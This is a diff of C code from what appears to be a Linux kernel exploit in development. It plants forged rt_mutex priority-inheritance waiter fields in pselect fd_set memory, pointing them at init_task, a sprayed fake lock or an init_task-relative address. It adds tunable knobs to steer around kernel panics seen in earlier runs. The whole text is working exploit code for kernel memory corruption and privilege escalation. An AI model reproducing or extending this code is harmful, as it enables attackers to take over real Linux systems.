@@ -350,14 +350,28 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
        *   fake_lock (spray) — the W0 tree linkage requires it.
        * No rebalance (child-present case). fake_task.pi_waiters NULL.
        */
+      /*
+       * A/B knobs (09-14 prio hunt): r219140 (left-pi @ prio=1) was the
+       * LAST clean walk on the fixed writer; today's four KP walks were
+       * all prio=0. MODE4_GHOST_PRIO defaults 0; MODE4_GHOST_LOCK =
+       * spray (default) | inittask878 (Z15-park-proven lock).
+       */
+      uint64_t ghost_prio =
+          (uint64_t)env_int_range("MODE4_GHOST_PRIO", 0, 0, 139);
+      uint64_t ghost_lock = (uint64_t)fake_lock;
+      if (env_flag("MODE4_GHOST_LOCK_INITTASK", 0)) {
+        ghost_lock = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+            (active_offsets ? active_offsets->off_init_task
+                            : (uint64_t)INIT_TASK_OFF) + 0x878ULL);
+      }
       struct pselect_waiter_word jc2_words[] = {
           {2, 0, "tree_left"},
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
           {5, 0, "pi_left"},
           {6, (uint64_t)init_task, "task"},
-          {7, (uint64_t)fake_lock, "lock"},
-          {8, 0, "prio"},
+          {7, ghost_lock, "lock"},
+          {8, ghost_prio, "prio"},
           {9, 0, "deadline"},
       };
       for (size_t i = 0; i < sizeof(jc2_words) / sizeof(jc2_words[0]);
@@ -367,9 +381,10 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                                 jc2_words[i].name);
       }
       pr_info("stack JC2 carrier: words2-9 zero, task=%016llx "
-              "(init_task P0) lock=%016llx prio=0 (write via W0)\n",
+              "(init_task P0) lock=%016llx prio=%llu (write via W0)\n",
               (unsigned long long)init_task,
-              (unsigned long long)fake_lock);
+              (unsigned long long)ghost_lock,
+              (unsigned long long)ghost_prio);
       goto stack_words_done;
     } else {
       uint64_t pi_parent = 0, pi_right = 0, pi_left = 0;
